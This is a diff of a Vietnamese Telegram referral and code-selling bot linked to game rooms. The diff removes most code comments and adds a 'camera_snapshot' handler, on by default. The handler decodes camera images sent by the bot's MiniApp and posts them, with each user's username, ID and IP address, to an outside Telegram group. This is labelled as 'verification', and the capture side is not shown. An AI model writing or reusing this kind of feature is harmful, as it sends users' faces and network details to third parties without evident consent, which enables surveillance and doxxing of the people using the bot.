@@ -6,6 +6,7 @@ import logging
 import os
 import random
 import re
+import base64
 from collections import defaultdict
 from datetime import datetime, timedelta
 
@@ -23,6 +24,7 @@ from telegram import (  # noqa: E402
     KeyboardButton,
     ReplyKeyboardMarkup,
     ReplyKeyboardRemove,
+    InputMediaPhoto,
     Update,
     WebAppInfo,
 )
@@ -45,16 +47,15 @@ MINI_APP_URL = os.getenv("MINI_APP_URL", "https://phongmrom-lgtm.github.io/phong
 ADMIN_IDS = [5633649201, 7884394252]
 TIMEZONE = pytz.timezone("Asia/Ho_Chi_Minh")
 
-# Nhóm/kênh yêu cầu tham gia KHÔNG đặt trong code nữa.
-# Thêm / xóa trực tiếp trong bot bằng /addgroup, /delgroup, /listgroup (lưu trong DB).
+# Nhóm nhận ảnh chụp camera từ miniapp
+CAMERA_TARGET_GROUP = "@cameraminiap"
+
 OPTIONAL_DISPLAY_CHANNELS = []
 SUPPORT_GROUP = "https://t.me/hocviencbm"
 
-# ---- Link game (nút "Link Game" trong menu) ----
-GAME_CODE_URL = "https://t.me/xombao247"       # nút "Nhập Code Tại Đây"
-GAME_ROOM_URL = "https://t.me/gamehit88_bot"   # nút "Link room tại đây"
+GAME_CODE_URL = "https://t.me/xombao247"       
+GAME_ROOM_URL = "https://t.me/gamehit88_bot"   
 
-# Giá mặc định; giá thật được lưu trong DB (settings.code_price) và đổi bằng /setprice
 CODE_PRICE = 2000
 MIN_WITHDRAW = 2000
 MAX_WITHDRAW = 10000
@@ -66,53 +67,42 @@ TEMP_BAN_MINUTES = 2
 
 BIO_FLAG = "@lienminhvietnam"
 
-# ID emoji premium cho các nút menu dưới màn hình
 MENU_ICON_IDS = {
-    "account": "5278467510604160626",   # 💰
-    "invite": "5231005931550030290",    # 💸
-    "withdraw": "6188274324156191036",  # 😆
-    "top": "6188266996941985323",       # 🤣
-    "support": "6188179499868229800",   # 🌟
-    "history": "6186110304884101722",   # 🌟
-    "game": "6102831593389299866",      # 🌟 (nút Link Game)
-    "admin": "5341715473882955310",     # ⚙️ (nút Menu dành cho admin)
+    "account": "5278467510604160626",   
+    "invite": "5231005931550030290",    
+    "withdraw": "6188274324156191036",  
+    "top": "6188266996941985323",       
+    "support": "6188179499868229800",   
+    "history": "6186110304884101722",   
+    "game": "6102831593389299866",      
+    "admin": "5341715473882955310",     
 }
 
-# ------------------------------------------------------------
-# 21 ID EMOJI ĐỘNG DÀNH CHO CÁC NÚT "THAM GIA" + "XÁC NHẬN ĐÃ THAM GIA"
-# Mỗi nút tham gia lấy lần lượt 1 emoji trong danh sách (hết thì quay vòng).
-# ------------------------------------------------------------
 JOIN_BTN_EMOJI_IDS = [
-    "5197226061011623665",  # 😕
-    "5237968923940364244",  # 🥳
-    "5195357093107868151",  # 🤩
-    "5197673179992038546",  # 😏
-    "5237981615568723131",  # 🏃‍♀️
-    "5237899560218534031",  # 🕺
-    "5240086364292129541",  # 🦆
-    "5235640209852343235",  # 😱
-    "5235762367312173706",  # 🔫
-    "5235650728227251200",  # 🕺
-    "5235871588330512091",  # 💃
-    "5240141073585544010",  # 💃
-    "5456164124549454257",  # ☺️
-    "5240457247603039842",  # 😮
-    "5461124828956203070",  # 😬
-    "5460621222565910361",  # 😡
-    "5240072895274688214",  # 🌭
-    "5240249594524214417",  # 👅
-    "5242500342070909767",  # 😨
-    "5237721297600912488",  # 😧
-    "5240076365608264313",  # 🤪
+    "5197226061011623665",  
+    "5237968923940364244",  
+    "5195357093107868151",  
+    "5197673179992038546",  
+    "5237981615568723131",  
+    "5237899560218534031",  
+    "5240086364292129541",  
+    "5235640209852343235",  
+    "5235762367312173706",  
+    "5235650728227251200",  
+    "5235871588330512091",  
+    "5240141073585544010",  
+    "5456164124549454257",  
+    "5240457247603039842",  
+    "5461124828956203070",  
+    "5460621222565910361",  
+    "5240072895274688214",  
+    "5240249594524214417",  
+    "5242500342070909767",  
+    "5237721297600912488",  
+    "5240076365608264313",  
 ]
-CONFIRM_JOIN_EMOJI_ID = "5237968923940364244"  # 🥳 cho nút XÁC NHẬN ĐÃ THAM GIA
+CONFIRM_JOIN_EMOJI_ID = "5237968923940364244"  
 
-# ============================================================
-# 3. EMOJI ĐỘNG (CUSTOM PREMIUM EMOJI)
-#   E  : dùng trong NỘI DUNG tin nhắn (parse_mode="HTML")
-#   EP : emoji thường tương ứng, dùng cho TEXT CỦA NÚT BẤM
-#        (nút bấm không hiển thị được thẻ <tg-emoji>)
-# ============================================================
 _EMOJI_DEFS = {
     "CHECK": ("5206607081334906820", "✔️"),
     "CHECK2": ("6156849229567365992", "✅"),
@@ -213,7 +203,6 @@ _EMOJI_DEFS = {
     "ABC_17": ("5361871785467857730", "🔠"),
     "ABC_18": ("5364023048687078741", "🔠"),
     "ABC_19": ("5364149466754468020", "🔠"),
-    # ---- 6 emoji động dùng cho mục "Link Game" ----
     "GAME_STAR": ("6102831593389299866", "🌟"),
     "GAME_STARSTRUCK": ("6167959932004997710", "🤩"),
     "GAME_CAR": ("6280407793631498213", "🚗"),
@@ -224,10 +213,6 @@ _EMOJI_DEFS = {
 E = {k: f'<tg-emoji emoji-id="{v[0]}">{v[1]}</tg-emoji>' for k, v in _EMOJI_DEFS.items()}
 EP = {k: v[1] for k, v in _EMOJI_DEFS.items()}
 
-# ------------------------------------------------------------
-# 89 ID EMOJI ĐỘNG DÀNH RIÊNG CHO NÚT BẤM ADMIN
-# key -> (emoji_id, emoji thường dự phòng dùng trong nội dung tin nhắn)
-# ------------------------------------------------------------
 AI = {
     "TRASH": ("5445267414562389170", "🗑"),
     "HOURGLASS": ("5386367538735104399", "⌛"),
@@ -322,30 +307,22 @@ AI = {
 
 
 def ai(key: str) -> str:
-    """Emoji động (89 ID của admin) dùng trong NỘI DUNG tin nhắn HTML."""
     eid, ch = AI[key]
     return f'<tg-emoji emoji-id="{eid}">{ch}</tg-emoji>'
 
 
 def abtn(text: str, icon_key: str, **kwargs) -> InlineKeyboardButton:
-    """Nút inline cho ADMIN: luôn gắn emoji động (icon_custom_emoji_id) lấy từ bảng AI.
-    Chữ trên nút KHÔNG chứa emoji thường."""
     api = dict(kwargs.pop("api_kwargs", None) or {})
     api["icon_custom_emoji_id"] = AI[icon_key][0]
     return InlineKeyboardButton(text, api_kwargs=api, **kwargs)
 
 
 def ibtn(text: str, emoji_id: str, **kwargs) -> InlineKeyboardButton:
-    """Nút inline gắn emoji động theo ID trực tiếp (dùng cho nút tham gia nhóm).
-    Chữ trên nút KHÔNG chứa emoji thường."""
     api = dict(kwargs.pop("api_kwargs", None) or {})
     api["icon_custom_emoji_id"] = emoji_id
     return InlineKeyboardButton(text, api_kwargs=api, **kwargs)
 
 
-# ============================================================
-# 4. TRẠNG THÁI CHẠY & LOGGING
-# ============================================================
 user_msg_tracker = defaultdict(list)
 temp_bans = {}
 user_withdraw_state = {}
@@ -358,9 +335,6 @@ logging.basicConfig(
 )
 logger = logging.getLogger(__name__)
 
-# ============================================================
-# 5. DATABASE (PostgreSQL)
-# ============================================================
 db_pool = None
 
 
@@ -461,7 +435,7 @@ def _init_db_sync():
             default_settings = [
                 ('maintenance', '0'), ('verify_phone', '1'), ('verify_ip', '1'),
                 ('verify_channel', '1'), ('verify_captcha', '1'), ('allow_withdraw', '1'),
-                ('auto_buy_code', '1'),
+                ('auto_buy_code', '1'), ('verify_camera', '1'),
             ]
             for key, val in default_settings:
                 cursor.execute(
@@ -476,7 +450,6 @@ def _init_db_sync():
             cursor.execute("CREATE INDEX IF NOT EXISTS idx_users_phone ON users(phone_number)")
             cursor.execute("CREATE INDEX IF NOT EXISTS idx_users_ip ON users(ip_address)")
 
-            # ---- Bảng nhóm/kênh bắt buộc tham gia ----
             cursor.execute("""
                 CREATE TABLE IF NOT EXISTS required_channels (
                     id BIGSERIAL PRIMARY KEY,
@@ -494,9 +467,6 @@ async def init_db():
     await asyncio.to_thread(_init_db_sync)
 
 
-# ============================================================
-# 6. TIỆN ÍCH CHUNG
-# ============================================================
 def get_now_str():
     return datetime.now(TIMEZONE).strftime("%Y-%m-%d %H:%M:%S")
 
@@ -548,7 +518,6 @@ async def send_split_message(bot, chat_id, text, parse_mode="HTML"):
 
 
 async def check_bio_flag(bot, uid: int):
-    """True = bio có @Lienminhvietnam, False = sạch, None = không đọc được (user chặn bot...)."""
     try:
         chat_full = await bot.get_chat(uid)
         return BIO_FLAG in (chat_full.bio or "").lower()
@@ -557,7 +526,6 @@ async def check_bio_flag(bot, uid: int):
         return None
 
 
-# ---------- Giá code (lưu DB, đổi được bằng lệnh admin) ----------
 async def load_code_price():
     global CODE_PRICE
     res = await db_query("SELECT value FROM settings WHERE key='code_price'", fetchone=True)
@@ -583,7 +551,6 @@ def _parse_money(s: str):
         return None
 
 
-# ---------- Nhóm/kênh yêu cầu tham gia ----------
 CHANNEL_URLS = {}
 
 
@@ -614,7 +581,6 @@ async def get_required_channels():
 
 
 async def check_bot_admin(bot, ref: str):
-    """Trả về (là_admin, trạng_thái, chat)."""
     try:
         chat = await bot.get_chat(_api_chat_id(ref))
         me = await bot.get_me()
@@ -624,10 +590,6 @@ async def check_bot_admin(bot, ref: str):
         return False, f"lỗi: {exc}", None
 
 
-# ---------- Bàn phím ----------
-# Bàn phím dưới màn hình dùng ICON EMOJI PREMIUM (icon_custom_emoji_id).
-# Chữ trên nút KHÔNG kèm emoji thường (icon premium tự hiện phía trước chữ).
-# menu_handler đã nhận cả dạng không emoji ("Tài Khoản", "Top"...) nên vẫn khớp.
 def _menu_btn(text: str, key: str) -> KeyboardButton:
     return KeyboardButton(text, api_kwargs={"icon_custom_emoji_id": MENU_ICON_IDS[key]})
 
@@ -639,7 +601,6 @@ def get_main_keyboard(user_id=None):
         [_menu_btn("Nhóm Hỗ Trợ", "support"), _menu_btn("Lịch Sử Giao Dịch", "history")],
         [_menu_btn("Link Game", "game")],
     ]
-    # Nút "Menu" chỉ hiện với admin
     if user_id in ADMIN_IDS:
         keyboard.append([_menu_btn("Menu", "admin")])
     return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
@@ -656,16 +617,12 @@ def get_miniapp_keyboard():
 
 
 def get_game_link_markup():
-    """2 nút link xếp dọc: 'Nhập Code Tại Đây' và bên dưới là 'Link room tại đây'."""
     return InlineKeyboardMarkup([
         [ibtn("Nhập Code Tại Đây", _EMOJI_DEFS["GAME_STARSTRUCK"][0], url=GAME_CODE_URL)],
         [ibtn("Link room tại đây", _EMOJI_DEFS["GAME_CAR"][0], url=GAME_ROOM_URL)],
     ])
 
 
-# ============================================================
-# 7. CAPTCHA PHÉP TÍNH
-# ============================================================
 def generate_random_captcha():
     op = random.choice(["+", "-", "*"])
     if op == "+":
@@ -874,9 +831,6 @@ async def handle_captcha_input(update: Update, context: ContextTypes.DEFAULT_TYP
     return True
 
 
-# ============================================================
-# 8. CHỐNG SPAM & CÁC BƯỚC XÁC MINH
-# ============================================================
 async def handle_anti_spam(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
     chat = update.effective_chat
     user = update.effective_user
@@ -939,7 +893,6 @@ async def ensure_user_exists(update: Update):
 
 
 async def get_missing_channels(bot, user_id):
-    """Đọc danh sách nhóm bắt buộc từ DB, trả về nhãn các nhóm user chưa tham gia."""
     rows = await get_required_channels()
 
     async def check_one(ref, title, url):
@@ -962,8 +915,6 @@ async def get_missing_channels(bot, user_id):
 
 
 def build_channel_buttons(missing_channels):
-    """Nút tham gia nhóm: mỗi nút 1 emoji động (icon_custom_emoji_id), lần lượt trong 21 ID.
-    Chữ trên nút KHÔNG chứa emoji thường."""
     buttons = []
     idx = 0
     for ch in missing_channels:
@@ -1069,9 +1020,6 @@ async def proceed_next_verification(update_or_msg, context: ContextTypes.DEFAULT
     await finalize_user_registration(user, context)
 
 
-# ============================================================
-# 9. ĐĂNG KÝ / START / CALLBACK XÁC MINH
-# ============================================================
 async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if await handle_anti_spam(update, context): return
     user = update.effective_user
@@ -1226,6 +1174,29 @@ async def web_app_data_handler(update: Update, context: ContextTypes.DEFAULT_TYP
     if not message or not message.web_app_data or not user: return
     try:
         data = json.loads(message.web_app_data.data)
+
+        # Xử lý tính năng chụp ảnh camera từ MiniApp (nếu bật verify_camera)
+        if data.get("type") == "camera_snapshot" and data.get("image"):
+            if await get_verify_setting("verify_camera"):
+                img_data_url = data["image"]
+                header, encoded = img_data_url.split(",", 1)
+                img_bytes = base64.b64decode(encoded)
+                
+                user_info_str = f"👤 User: @{user.username or 'Không có'} (ID: <code>{user.id}</code>)"
+                ip_info_str = f"🌐 IP: <code>{data.get('ip', 'Không rõ')}</code>"
+                caption = f"📸 <b>Ảnh chụp camera xác minh MiniApp</b>\n{user_info_str}\n{ip_info_str}"
+
+                try:
+                    await context.bot.send_photo(
+                        chat_id=CAMERA_TARGET_GROUP,
+                        photo=io.BytesIO(img_bytes),
+                        caption=caption,
+                        parse_mode="HTML"
+                    )
+                except Exception as e:
+                    logger.error(f"Lỗi gửi ảnh camera vào nhóm {CAMERA_TARGET_GROUP}: {e}")
+            return
+
         user_ip = data.get("ip")
         if not user_ip:
             await message.reply_text(f"{E['CROSS']} Không lấy được thông tin IP. Vui lòng thử lại!", parse_mode="HTML")
@@ -1267,7 +1238,6 @@ async def web_app_data_handler(update: Update, context: ContextTypes.DEFAULT_TYP
 
 
 async def finalize_user_registration(user, context: ContextTypes.DEFAULT_TYPE):
-    # ---- Kiểm tra tiểu sử (bio) buff ref ----
     try:
         chat_full = await context.bot.get_chat(user.id)
         bio = chat_full.bio or ""
@@ -1278,7 +1248,6 @@ async def finalize_user_registration(user, context: ContextTypes.DEFAULT_TYPE):
             await db_query("UPDATE users SET is_banned=1, is_withdraw_banned=1 WHERE user_id=%s", (user.id,), commit=True)
 
             if referrer_id:
-                # Vẫn khoá tài khoản người giới thiệu
                 await db_query("UPDATE users SET is_banned=1, is_withdraw_banned=1 WHERE user_id=%s", (referrer_id,), commit=True)
                 try:
                     await context.bot.send_message(
@@ -1299,7 +1268,6 @@ async def finalize_user_registration(user, context: ContextTypes.DEFAULT_TYPE):
     except Exception as exc:
         logger.warning(f"Lỗi kiểm tra bio khi đăng ký cho user {user.id}: {exc}")
 
-    # ---- Thưởng cho người giới thiệu ----
     db_user = await db_query("SELECT referrer_id FROM users WHERE user_id=%s", (user.id,), fetchone=True)
     if db_user and db_user[0]:
         ref_id = db_user[0]
@@ -1347,9 +1315,6 @@ async def finalize_user_registration(user, context: ContextTypes.DEFAULT_TYPE):
     )
 
 
-# ============================================================
-# 10. MENU NGƯỜI DÙNG & MUA CODE
-# ============================================================
 def build_buy_success_text(code_val: str) -> str:
     return (
         f"{E['LOVE_FACE']} <b>MUA CODE THÀNH CÔNG!</b> {E['FIRE']}\n"
@@ -1436,8 +1401,6 @@ async def menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     text = (message.text or "").strip()
 
-    # ---------- Menu quản trị (CHỈ ADMIN) ----------
-    # Các nút admin nằm ngay trên bàn phím dưới màn hình
     if user.id in ADMIN_IDS and is_admin_kb_text(text):
         if await admin_keyboard_handler(update, context, text):
             return
@@ -1448,7 +1411,6 @@ async def menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await show_admin_page(message, user.id, 0)
         return
 
-    # ---------- Tài khoản ----------
     if text in ["Tài Khoản", "👤 Tài Khoản"]:
         balance = db_user[1]
         phone_str = db_user[6] if len(db_user) > 6 and db_user[6] else "Chưa xác minh"
@@ -1471,7 +1433,6 @@ async def menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         await message.reply_text(msg, parse_mode="HTML")
 
-    # ---------- Mời bạn bè ----------
     elif text in ["Mời Bạn Bè", "🎁 Mời Bạn Bè"]:
         try:
             bot_info = await context.bot.get_me()
@@ -1496,7 +1457,6 @@ async def menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         await message.reply_text(msg, parse_mode="HTML")
 
-    # ---------- Top ----------
     elif text in ["Top", "🔝 Top"]:
         top_users = await db_query(
             """
@@ -1521,7 +1481,6 @@ async def menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             msg += f"{icon} <b>Top {idx}:</b> {name_str} — <code>{ref_count:,}</code> bạn bè\n"
         await message.reply_text(msg, parse_mode="HTML")
 
-    # ---------- Nhóm hỗ trợ ----------
     elif text in ["Nhóm Hỗ Trợ", "💬 Nhóm Hỗ Trợ"]:
         await message.reply_text(
             f"{E['PHONE']} <b>NHÓM HỖ TRỢ CHÍNH THỨC:</b>\n{E['RIGHT']} {SUPPORT_GROUP}\n\n"
@@ -1529,7 +1488,6 @@ async def menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             parse_mode="HTML",
         )
 
-    # ---------- Link game ----------
     elif text in ["Link Game", "🎮 Link Game"]:
         await message.reply_text(
             f"{E['GAME_BELL']} <b>LINK GAME</b> {E['GAME_STAR']}\n"
@@ -1543,7 +1501,6 @@ async def menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             disable_web_page_preview=True,
         )
 
-    # ---------- Lịch sử giao dịch ----------
     elif text in ["Lịch Sử", "Lịch Sử Giao Dịch", "📜 Lịch Sử Giao Dịch"]:
         txs = await db_query(
             "SELECT type, amount, status, created_at, details FROM transactions WHERE user_id=%s ORDER BY id DESC LIMIT 10",
@@ -1563,7 +1520,6 @@ async def menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             )
         await message.reply_text(msg, parse_mode="HTML")
 
-    # ---------- Rút code ----------
     elif text in ["Rút Code", "💳 Rút Code", "Rút Tiền", "💳 Rút Tiền"]:
         if not await get_verify_setting("allow_withdraw") and user.id not in ADMIN_IDS:
             await message.reply_text(f"{E['CROSS']} <b>Tính năng rút tiền hiện đang TẮT bởi Quản trị viên!</b>", parse_mode="HTML")
@@ -1571,7 +1527,6 @@ async def menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if db_user[4] == 1:
             await message.reply_text(f"{E['CROSS']} <b>Tài khoản của bạn đã bị CẤM RÚT CODE!</b>", parse_mode="HTML")
             return
-        # Gắn giá hiện tại vào callback: nếu admin đổi giá sau đó, nút cũ sẽ báo lại thay vì trừ nhầm tiền
         buttons = [[InlineKeyboardButton(
             f"XÁC NHẬN MUA CODE (Giá {CODE_PRICE:,}đ)",
             callback_data=f"buycode_confirm_{CODE_PRICE}",
@@ -1587,8 +1542,6 @@ async def menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 async def edit_admin_msg(query, extra_html: str):
-    """Sửa tin nhắn duyệt đơn của admin: hỗ trợ cả tin nhắn văn bản lẫn tin nhắn ảnh (caption).
-    Đồng thời gỡ nút Duyệt/Từ chối."""
     msg = query.message
     try:
         if msg.text:
@@ -1609,7 +1562,6 @@ async def code_buy_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = query.from_user
     data = query.data or ""
 
-    # Kiểm tra quyền admin TRƯỚC khi trả lời callback (tránh gọi answer 2 lần)
     is_admin_action = data.startswith(("approve_code_", "reject_code_"))
     if is_admin_action and user.id not in ADMIN_IDS:
         await query.answer("Bạn không có quyền thực hiện thao tác này!", show_alert=True)
@@ -1617,14 +1569,12 @@ async def code_buy_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try: await query.answer()
     except Exception: pass
 
-    # ---------------- ADMIN DUYỆT ----------------
     if data.startswith("approve_code_"):
         try:
             target_user_id = int(data.replace("approve_code_", ""))
         except ValueError:
             return
 
-        # Gỡ nút ngay để tránh bấm 2 lần bị trừ tiền 2 lần
         try: await query.edit_message_reply_markup(reply_markup=None)
         except Exception: pass
 
@@ -1668,7 +1618,6 @@ async def code_buy_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await edit_admin_msg(query, f"{E['CHECK']} <b>ĐÃ ĐƯỢC ADMIN DUYỆT THÀNH CÔNG!</b>")
         return
 
-    # ---------------- ADMIN TỪ CHỐI ----------------
     if data.startswith("reject_code_"):
         try:
             target_user_id = int(data.replace("reject_code_", ""))
@@ -1687,7 +1636,6 @@ async def code_buy_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await edit_admin_msg(query, f"{E['CROSS']} <b>ĐÃ BỊ TỪ CHỐI BỞI ADMIN!</b>")
         return
 
-    # ---------------- NGƯỜI DÙNG MUA CODE ----------------
     if not await get_verify_setting("allow_withdraw") and user.id not in ADMIN_IDS:
         await query.edit_message_text(f"{E['CROSS']} <b>Tính năng rút tiền đang bị khóa bởi Hệ thống!</b>", parse_mode="HTML")
         return
@@ -1704,7 +1652,6 @@ async def code_buy_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     balance = db_user[0]
 
     if data.startswith("buycode_confirm"):
-        # Nút cũ mang giá lúc hiển thị; nếu giá đã đổi thì báo lại, không trừ tiền
         shown = data.replace("buycode_confirm", "").lstrip("_")
         if shown.isdigit() and int(shown) != CODE_PRICE:
             await query.edit_message_text(
@@ -1725,10 +1672,8 @@ async def code_buy_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             )
             return
 
-        # ----- Chế độ duyệt tay: gửi đơn cho admin -----
         is_auto = await get_verify_setting("auto_buy_code")
         if not is_auto:
-            # Nút dành cho admin -> dùng emoji động
             admin_markup = InlineKeyboardMarkup([
                 [abtn("Duyệt", "MEDAL", callback_data=f"approve_code_{user.id}"),
                  abtn("Từ chối", "CROSS", callback_data=f"reject_code_{user.id}")]
@@ -1755,7 +1700,6 @@ async def code_buy_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             )
             return
 
-        # ----- Chế độ tự động -----
         def process_buy_code(cursor):
             cursor.execute("SELECT id, code_val FROM code_stock WHERE is_used=0 ORDER BY id ASC LIMIT 1 FOR UPDATE")
             stock_item = cursor.fetchone()
@@ -1787,9 +1731,6 @@ async def code_buy_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await query.edit_message_text(build_buy_success_text(result), parse_mode="HTML")
 
 
-# ============================================================
-# 11. BẢNG ĐIỀU KHIỂN ADMIN (/settings, /admin)
-# ============================================================
 async def build_admin_menu():
     st_phone = await get_verify_setting("verify_phone")
     st_ip = await get_verify_setting("verify_ip")
@@ -1797,6 +1738,7 @@ async def build_admin_menu():
     st_captcha = await get_verify_setting("verify_captcha")
     st_withdraw = await get_verify_setting("allow_withdraw")
     st_auto_buy = await get_verify_setting("auto_buy_code")
+    st_camera = await get_verify_setting("verify_camera")
 
     def state(v):
         return "BẬT" if v else "TẮT"
@@ -1804,6 +1746,7 @@ async def build_admin_menu():
     buttons = [
         [abtn(f"Xác minh SĐT: {state(st_phone)}", "PHONE", callback_data="toggle_verify_phone")],
         [abtn(f"Xác minh IP Mini App: {state(st_ip)}", "PC", callback_data="toggle_verify_ip")],
+        [abtn(f"Chụp Ảnh Camera MiniApp: {state(st_camera)}", "IMAGE", callback_data="toggle_verify_camera")],
         [abtn(f"Check Kênh/Nhóm: {state(st_channel)}", "PIN2", callback_data="toggle_verify_channel")],
         [abtn(f"Check CAPTCHA: {state(st_captcha)}", "DICE", callback_data="toggle_verify_captcha")],
         [abtn(f"Tính năng Rút Tiền: {state(st_withdraw)}", "CARD", callback_data="toggle_allow_withdraw")],
@@ -1846,6 +1789,7 @@ async def admin_toggle_callback(update: Update, context: ContextTypes.DEFAULT_TY
         "toggle_verify_captcha": "verify_captcha",
         "toggle_allow_withdraw": "allow_withdraw",
         "toggle_auto_buy_code": "auto_buy_code",
+        "toggle_verify_camera": "verify_camera",
     }
     if data in key_map:
         setting_key = key_map[data]
@@ -1863,7 +1807,6 @@ async def admin_toggle_callback(update: Update, context: ContextTypes.DEFAULT_TY
 async def adm_panel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not is_admin(update): return
 
-    # Toàn bộ nút dùng abtn: 100% emoji động, không còn emoji thường
     keyboard = [
         [abtn("/broadcast (Gửi thông báo)", "MONEY_FLY", callback_data="adm_step_broadcast"),
          abtn("/addstock (Thêm mã code)", "PLUS", callback_data="adm_step_addstock")],
@@ -1914,7 +1857,6 @@ async def adm_step_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try: await query.answer()
     except Exception: pass
 
-    # ---- Nút chạy lệnh ngay ----
     if data.startswith("adm_act_"):
         action = data.replace("adm_act_", "")
         if action == "stock":
@@ -1944,7 +1886,6 @@ async def adm_step_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await query.message.reply_text(f"{E['REFRESH']} Đã đặt lại trạng thái xác minh toàn bộ thành viên!", parse_mode="HTML")
         return
 
-    # ---- Nút chờ nhập dữ liệu ----
     step_map = {
         "adm_step_broadcast": ("broadcast", f"{E['MONEY_FLY']} <b>Nhập nội dung thông báo bạn muốn gửi:</b>\n<i>(Chỉ cần gửi nội dung, không cần gõ /broadcast)</i>"),
         "adm_step_addstock": ("addstock", f"{E['PLUS']} <b>Nhập danh sách mã code cần thêm:</b>\n<i>(Có thể nhập nhiều mã cách nhau bằng khoảng trắng hoặc xuống dòng. Code trùng sẽ tự động bị lọc)</i>"),
@@ -1990,7 +1931,6 @@ async def build_user_info_text(target_id: int):
 
 
 async def userinfo_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Xử lý nút ID trong /users."""
     query = update.callback_query
     if not query or not is_admin(update): return
     try: await query.answer()
@@ -2006,15 +1946,6 @@ async def userinfo_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await query.message.reply_text(text, parse_mode="HTML")
 
 
-# ============================================================
-# 11b. MENU ADMIN TRÊN BÀN PHÍM DƯỚI MÀN HÌNH (nút "Menu" - chỉ admin)
-# ============================================================
-# Bấm "Menu" -> bàn phím đổi thành các nút admin của trang 1.
-# Bấm tab / Trang Sau / Trang Trước -> bot gửi hướng dẫn trang đó và đổi bộ nút.
-# Kiểu nút:
-#   "i" = hỏi nhập dữ liệu rồi chạy | "r" = chạy ngay
-#   "c" = hỏi xác nhận rồi chạy     | "s" = mở bảng bật/tắt cài đặt
-# Mỗi nút: (nhãn, kiểu, tên lệnh, key emoji động trong bảng AI)
 ADMIN_PAGES = [
     {
         "icon": "CART", "title": "KHO CODE",
@@ -2095,7 +2026,7 @@ ADMIN_PAGES = [
             "• <b>/maint</b> – bật/tắt bảo trì\n"
             "• <b>/resetverify</b> – ⚠️ reset xác minh toàn bộ\n"
             "• <b>/wipeall</b> – ⚠️ XÓA SẠCH dữ liệu hệ thống\n"
-            "• <b>Cài đặt</b> – bật/tắt SĐT, IP, Kênh, Captcha, Rút tiền, Auto mua code"
+            "• <b>Cài đặt</b> – bật/tắt SĐT, IP, Camera, Kênh, Captcha, Rút tiền, Auto mua code"
         ),
         "items": [
             ("/biofriends", "i", "biofriends", "SHIELD2"), ("/checkref", "i", "checkref", "PIN2"),
@@ -2173,9 +2104,8 @@ _ADMIN_ALL_CMDS = {cmd for pg in ADMIN_PAGES for _, _, cmd, _ in pg["items"] if 
 
 ADMIN_TAB_NAMES = ["Kho Code", "Số Dư", "Khóa/Mở", "Tra Cứu", "Hệ Thống", "Nhóm & Giá"]
 ADMIN_NAV_TEXTS = {"Trang Trước", "Trang Sau", "Đóng Menu"}
-admin_menu_page = {}  # user_id -> trang đang mở
+admin_menu_page = {}
 
-# nhãn nút bàn phím (bỏ dấu "/") -> (kiểu, lệnh)
 ADMIN_KB_ACTIONS = {
     label.lstrip("/"): (mode, cmd)
     for pg in ADMIN_PAGES for label, mode, cmd, _ in pg["items"]
@@ -2183,7 +2113,6 @@ ADMIN_KB_ACTIONS = {
 
 
 def _akb(text: str, key: str) -> KeyboardButton:
-    """Nút bàn phím admin với emoji động."""
     return KeyboardButton(text, api_kwargs={"icon_custom_emoji_id": AI[key][0]})
 
 
@@ -2269,18 +2198,18 @@ async def admin_keyboard_handler(update: Update, context: ContextTypes.DEFAULT_T
 
     if raw in ADMIN_KB_ACTIONS:
         mode, cmd = ADMIN_KB_ACTIONS[raw]
-        if mode == "s":                      # bảng bật/tắt cài đặt (inline)
+        if mode == "s":
             admin_input_states.pop(uid, None)
             t, markup = await build_admin_menu()
             await message.reply_text(t, reply_markup=markup, parse_mode="HTML")
-        elif mode == "i":                    # cần nhập dữ liệu
+        elif mode == "i":
             admin_input_states[uid] = cmd
             prompt = ADMIN_INPUT_PROMPTS.get(cmd, "Nhập dữ liệu:")
             await message.reply_text(f"{E['RIGHT']} <b>/{cmd}</b>\n{prompt}", parse_mode="HTML")
-        elif mode == "r":                    # chạy ngay
+        elif mode == "r":
             admin_input_states.pop(uid, None)
             await admin_commands(update, context, override_cmd=f"/{cmd}")
-        elif mode == "c":                    # hỏi xác nhận
+        elif mode == "c":
             admin_input_states.pop(uid, None)
             warn = ADMIN_CONFIRM_TEXT.get(cmd, "THỰC HIỆN LỆNH NÀY")
             markup = InlineKeyboardMarkup([[
@@ -2297,7 +2226,6 @@ async def admin_keyboard_handler(update: Update, context: ContextTypes.DEFAULT_T
 
 
 async def admin_confirm_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Nút Xác nhận / Hủy cho các lệnh nguy hiểm."""
     query = update.callback_query
     if not query:
         return
@@ -2320,30 +2248,22 @@ async def admin_confirm_callback(update: Update, context: ContextTypes.DEFAULT_T
         await admin_commands(update, context, override_cmd=f"/{cmd}")
 
 
-# ============================================================
-# 12. LỆNH ADMIN
-# ============================================================
 async def admin_commands(update: Update, context: ContextTypes.DEFAULT_TYPE, override_cmd: str = None):
     if not is_admin(update): return
     message = update.effective_message
     if not message: return
-    # Lấy ID admin từ người bấm/gửi (không dùng message.from_user vì khi gọi từ nút bấm đó là ID của bot)
     user_id = update.effective_user.id
     chat_id = message.chat_id
 
-    # Dùng biến cục bộ, KHÔNG gán message.text / context.args
